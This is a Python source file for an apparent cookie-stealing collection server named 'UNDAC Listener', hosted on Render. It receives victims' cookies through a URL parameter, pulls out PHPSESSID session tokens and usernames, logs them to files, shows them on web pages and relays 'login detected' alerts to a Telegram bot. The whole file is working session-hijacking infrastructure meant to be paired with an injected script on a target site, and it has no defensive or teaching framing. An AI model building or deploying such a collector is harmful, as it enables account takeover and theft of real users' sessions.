from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote
import os
from datetime import datetime
import sys
import json
import urllib.request
import urllib.parse
import threading

# Render asigna el puerto dinámico en la variable PORT
PORT = int(os.environ.get("PORT", 8000))

# Configuración de Telegram
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

def send_telegram_message(message):
    """Envía un mensaje a Telegram de forma asíncrona"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram no configurado. Omite notificacion.", file=sys.stderr, flush=True)
        return
    
    def send_async():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = urllib.parse.urlencode({
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }).encode()
            
            req = urllib.request.Request(url, data=data)
            with urllib.request.urlopen(req, timeout=10) as response:
                response.read()
            print("Notificacion Telegram enviada", file=sys.stderr, flush=True)
        except Exception as e:
            print(f"Error enviando a Telegram: {e}", file=sys.stderr, flush=True)
    
    thread = threading.Thread(target=send_async)
    thread.daemon = True
    thread.start()

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == "/ping":
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"pong")
            return
        
        query = parse_qs(parsed_path.query)
        c_value = query.get('c', [''])[0]
        
        login_detected = False
        login_user = "Desconocido"
        
        if c_value:
            decoded_cookies = unquote(c_value)
            
            login_patterns = [
                'PHPSESSID',
                'sessionid',
                'user_id',
                'username',
                'logged_in',
                'auth_token',
            ]
            
            for pattern in login_patterns:
                if pattern.lower() in decoded_cookies.lower():
                    login_detected = True
                    
                    if 'usuario' in decoded_cookies.lower() or 'user' in decoded_cookies.lower():
                        try:
                            import re
                            user_match = re.search(r'(?:usuario|user|username)=([^;]+)', decoded_cookies, re.IGNORECASE)
                            if user_match:
                                login_user = user_match.group(1)
                        except:
                            pass
                    break
        
        print(f"\n{'='*80}", file=sys.stderr, flush=True)
        print(f"[{datetime.now()}] Peticion recibida:", file=sys.stderr, flush=True)
        print(f"Path: {self.path}", file=sys.stderr, flush=True)
        print(f"IP Cliente: {self.client_address[0]}", file=sys.stderr, flush=True)
        
        if login_detected:
            print(f"LOGIN DETECTADO! Usuario: {login_user}", file=sys.stderr, flush=True)
        
        if c_value:
            decoded_cookies = unquote(c_value)
            
            print(f"Cookie recibida (decodificada): {decoded_cookies[:200]}...", file=sys.stderr, flush=True)
            
            try:
                with open('cookies_captured.log', 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*60}\n")
                    f.write(f"Fecha: {datetime.now()}\n")
                    f.write(f"IP: {self.client_address[0]}\n")
                    f.write(f"Path: {self.path}\n")
                    f.write(f"Cookie completa: {decoded_cookies}\n")
                    
                    phpsessid = None
                    if 'PHPSESSID' in decoded_cookies:
                        for part in decoded_cookies.split(';'):
                            part = part.strip()
                            if part.startswith('PHPSESSID='):
                                phpsessid = part[10:]
                                f.write(f"PHPSESSID: {phpsessid}\n")
                                print(f"PHPSESSID encontrada: {phpsessid}", file=sys.stderr, flush=True)
                                break
                    else:
                        f.write("No se encontro PHPSESSID\n")
                        print("No se encontro PHPSESSID", file=sys.stderr, flush=True)
                
                if phpsessid:
                    with open('phpsessid.txt', 'a', encoding='utf-8') as pf:
                        pf.write(f"{datetime.now()} - {phpsessid} - IP:{self.client_address[0]}\n")
                
                if login_detected:
                    telegram_msg = f"""
LOGIN DETECTADO - UNDAC Listener

Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Usuario: {login_user}
IP: {self.client_address[0]}
PHPSESSID: {phpsessid if phpsessid else 'No encontrada'}

Path: {self.path[:50]}...
                    """
                elif phpsessid:
                    telegram_msg = f"""
Cookie Capturada - UNDAC Listener

Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
IP: {self.client_address[0]}
PHPSESSID: {phpsessid}

Login no confirmado, solo sesion
                    """
                else:
                    telegram_msg = f"""
Datos Recibidos - UNDAC Listener

Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
IP: {self.client_address[0]}
Path: {self.path[:100]}...

Sin PHPSESSID detectada
                    """
                
                send_telegram_message(telegram_msg.strip())
                    
            except Exception as e:
                print(f"Error escribiendo archivo: {e}", file=sys.stderr, flush=True)
        
        if self.path == '/' or self.path == '/status':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = f"""<html>
<head><title>UNDAC Listener</title>
<meta http-equiv="refresh" content="10">
<style>
body {{ font-family: Arial, sans-serif; padding: 20px; }}
.success {{ color: green; }}
.warning {{ color: orange; }}
</style>
</head>
<body>
<h1>Servidor funcionando</h1>
<p><b>Hora:</b> {datetime.now()}</p>
<p><b>Estado Telegram:</b> <span class="{'success' if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID else 'warning'}">
{'Configurado' if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID else 'No configurado'}
</span></p>
<p><a href="/logs">Ver logs</a> | <a href="/stats">Estadisticas</a></p>
</body></html>"""
            self.wfile.write(html.encode('utf-8'))
            return
        
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            try:
                login_count = 0
                if os.path.exists('phpsessid.txt'):
                    with open('phpsessid.txt', 'r', encoding='utf-8') as f:
                        login_count = sum(1 for line in f if line.strip())
                
                html = f"""<html><body>
<h1>Estadisticas</h1>
<p><b>Total logins capturados:</b> {login_count}</p>
<p><b>Servidor activo desde:</b> {datetime.now()}</p>
<p><a href="/">Volver</a></p>
</body></html>"""
                self.wfile.write(html.encode('utf-8'))
            except Exception as e:
                self.wfile.write(f"<h1>Error: {e}</h1>".encode('utf-8'))
            return
        
        elif self.path == '/logs':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            try:
                if os.path.exists('cookies_captured.log'):
                    with open('cookies_captured.log', 'r', encoding='utf-8') as f:
                        logs = f.read()[-10000:]
                    html = f"<html><body><h1>Ultimos logs</h1><pre>{logs}</pre><p><a href='/'>Volver</a></p></body></html>"
                    self.wfile.write(html.encode('utf-8'))
                else:
                    self.wfile.write("<h1>No hay logs aun</h1><p><a href='/'>Volver</a></p>".encode('utf-8'))
            except:
                self.wfile.write(b"<h1>Error leyendo logs</h1>")
            return
        
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        pass

print(f"\n{'='*80}", file=sys.stderr, flush=True)
print(f"Servidor UNDAC Listener iniciado", file=sys.stderr, flush=True)
print(f"Puerto: {PORT}", file=sys.stderr, flush=True)
print(f"URL: https://listener-koyk.onrender.com", file=sys.stderr, flush=True)
print(f"Telegram: {'Configurado' if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID else 'No configurado'}", file=sys.stderr, flush=True)
print(f"Hora: {datetime.now()}", file=sys.stderr, flush=True)
print(f"{'='*80}", file=sys.stderr, flush=True)

if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
    start_msg = f"""
UNDAC Listener Iniciado

Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
URL: https://listener-koyk.onrender.com
Estado: Online y monitoreando

Esperando logins...
    """
    send_telegram_message(start_msg.strip())

try:
    with open('cookies_captured.log', 'a', encoding='utf-8') as f:
        f.write(f"\n{'#'*80}\n")
        f.write(f"Servidor reiniciado: {datetime.now()}\n")
        f.write(f"Telegram: {'SI' if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID else 'NO'}\n")
        f.write(f"{'#'*80}\n")
except:
    pass

with HTTPServer(("", PORT), RequestHandler) as httpd:
    print(f"Esperando logins y cookies...", file=sys.stderr, flush=True)
    httpd.serve_forever()